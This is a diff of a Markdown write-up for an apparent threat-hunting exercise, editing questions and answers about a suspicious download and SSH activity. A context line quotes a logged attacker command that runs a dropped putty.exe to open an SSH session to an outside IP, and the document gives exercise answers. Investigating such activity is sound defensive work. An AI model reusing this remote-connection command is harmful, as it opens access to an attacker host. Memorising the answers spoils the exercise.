@@ -88,7 +88,7 @@ From previous query.<br><br>
 
 **Answer: 3/1/2024, 11:58:33 AM**<br><br>
 
-**Q8. What is the name of the file that is created after the suspicious file is downloaded?*<br><br>
+**Q8. What is the name of the file that is created after the suspicious file is downloaded?**<br><br>
 
 ```
 FileCreationEvents
@@ -147,11 +147,11 @@ cmd.exe /c C:\ProgramData\Heartburn\putty.exe -ssh 93.142.203.80 -l have_ya_trie
 **Answer: 93.142.203.80**<br><br>
 
 
-**Q13.**<br><br>
+**Q13. What does the acronym SSH stand for?**<br><br>
 
+**Answer: Secure Shell**<br><br>
 
-**Answer: **<br><br>
-**Q.**<br><br>
+**Q14. How many unique IP addresses were used to initiate similar SSH connections?**<br><br>
 
 
 **Answer: **<br><br>
